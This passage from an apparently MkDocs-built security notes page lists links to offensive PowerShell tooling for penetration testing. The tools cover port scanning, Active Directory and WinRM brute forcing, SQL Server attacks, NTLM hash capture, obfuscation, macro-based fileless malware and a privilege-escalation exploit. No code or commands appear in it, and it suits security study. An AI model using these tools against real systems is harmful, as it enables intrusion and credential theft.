<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1">Start-CaptureServer</a>Run a web server which logs Basic authentication and SMB hashes.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/ConvertTo-ROT13.ps1">ConvertTo-ROT13</a>Encode a string to ROT13 or decode a ROT13 string.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1">Out-DnsTxt</a>Generate DNS TXT records which could be used with other scripts.</li>
</ul>
</li>
</ul>
</li>
<li>External Services <ul>
<li>Shodan: <a href="https://github.com/darkoperator/Posh-Shodan">https://github.com/darkoperator/Posh-Shodan</a></li>
</ul>
</li>
<li>Scaning<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1</a></li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1">https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1</a></li>
<li>Parse Nmap Reports: <a href="https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1">https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1</a></li>
<li>Paser Nessus Reports: <a href="https://github.com/darkoperator/Posh-NVS">https://github.com/darkoperator/Posh-NVS</a></li>
<li>Scandiff is a PowerShell script to automate host discovery and scanning with nmap: <a href="https://github.com/hardwaterhacker/scandiff">https://github.com/hardwaterhacker/scandiff</a></li>
</ul>
</li>
<li>Brute Forcing<ul>
<li>Active Directory brute forcing: <a href="https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1">https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1</a></li>
<li>Get-WinRMPassword - <a href="https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html">https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html</a></li>
<li>Get-WimPassword</li>
</ul>
</li>
<li>Database Attacks<ul>
<li>PowerUpSQL - Toolkit for Attacking SQL Server: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li>
<li>Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1</li>
</ul>
</li>
<li>Capture NTLM<ul>
<li><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></li>
</ul>
</li>
<li>Obfuscation<ul>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
<li><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li>
</ul>
</li>
<li>Fileless Malware<ul>
<li>Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: <a href="https://github.com/G4lB1t/Invoke-NoShell">https://github.com/G4lB1t/Invoke-NoShell</a></li>
</ul>
</li>
</ul>
<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">&para;</a></h2>
<h3 id="new-references">New References<a class="headerlink" href="#new-references" title="Permanent link">&para;</a></h3>
<ul>
<li>PowerShell Basics for Security Professionals Part 1: <a href="https://www.youtube.com/watch?v=B0EsL1j_-qw">https://www.youtube.com/watch?v=B0EsL1j_-qw</a></li>
<li>Constrained Mode: <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a></li>
<li><a href="https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1">https://github.com/subTee/CVE-2014-4113/blob/master/Invoke-SystemShell.ps1</a></li>
<li><a href="http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html">http://www.labofapenetrationtester.com/2014/12/using-nishang-with-cobalt-strike.html</a></li>
<li><a href="http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/">http://blog.cobaltstrike.com/2014/09/23/cobalt-strike-2-1-i-have-the-powershell/</a></li>
</ul>
<h3 id="development-environment">Development Environment<a class="headerlink" href="#development-environment" title="Permanent link">&para;</a></h3>
<ul>
<li>How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: <a href="https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/">https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/</a></li>
</ul>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../active-directory/" title="Active Directory" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Active Directory
              </span>
            </div>
          </a>
        
        
          <a href="../windows-issues/" title="Windows issues" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Windows issues
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.39abc4af.js"></script>
      
      <script>app.initialize({version:"1.1.2",url:{base:"../.."}})</script>
      
    
  </body>
</html>